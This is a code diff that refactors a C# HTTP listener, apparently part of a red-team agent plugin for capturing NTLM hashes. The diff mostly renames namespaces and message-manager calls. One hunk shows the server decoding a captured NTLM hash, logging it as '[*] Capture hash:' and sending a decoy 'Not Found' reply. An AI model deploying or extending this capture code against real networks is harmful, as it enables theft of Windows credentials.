@@ -1,10 +1,7 @@
-﻿using System;
-using System.Net;
-using System.Net.Sockets;
+﻿using System.Net.Sockets;
 using System.Text;
-using farmer;
 
-namespace Plugin
+namespace Agent
 {
     class FarmerServer
     {
@@ -41,11 +38,11 @@ namespace Plugin
                 {
                     if (e.ToString().Contains("WSACancelBlockingCall"))
                     {
-                        FarmerPlugin.messageManager.Write(Environment.NewLine + "Server Stopped", Config.task_id, true);
+                        Plugin.messageManager.Write(Environment.NewLine + "Server Stopped", Config.task_id, true);
                     }
                     else
                     {
-                        FarmerPlugin.messageManager.Write(e.ToString(), Config.task_id, true, "error");
+                        Plugin.messageManager.Write(e.ToString(), Config.task_id, true, "error");
 
                     }
                 }
@@ -110,11 +107,11 @@ namespace Plugin
             {
                 if (e.ToString().Contains("WSACancelBlockingCall"))
                 {
-                    FarmerPlugin.messageManager.Write(Environment.NewLine + "Server Stopped", Config.task_id, true);
+                    Plugin.messageManager.Write(Environment.NewLine + "Server Stopped", Config.task_id, true);
                 }
                 else
                 {
-                    FarmerPlugin.messageManager.Write(e.ToString(), Config.task_id, true, "error");
+                    Plugin.messageManager.Write(e.ToString(), Config.task_id, true, "error");
 
                 }
                 this.Stop();
@@ -142,7 +139,7 @@ namespace Plugin
                         var NTLMHashString = DecodeNTLM(NTLMHash);
                         sb.AppendLine("[*] Capture hash:");
                         sb.AppendLine(NTLMHashString);
-                        FarmerPlugin.messageManager.Write(sb.ToString(), Config.task_id, false);
+                        Plugin.messageManager.Write(sb.ToString(), Config.task_id, false);
                         return "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: Close\r\nContent-Length: 11\r\n\r\nNot Found\r\n";
                     }
                 }
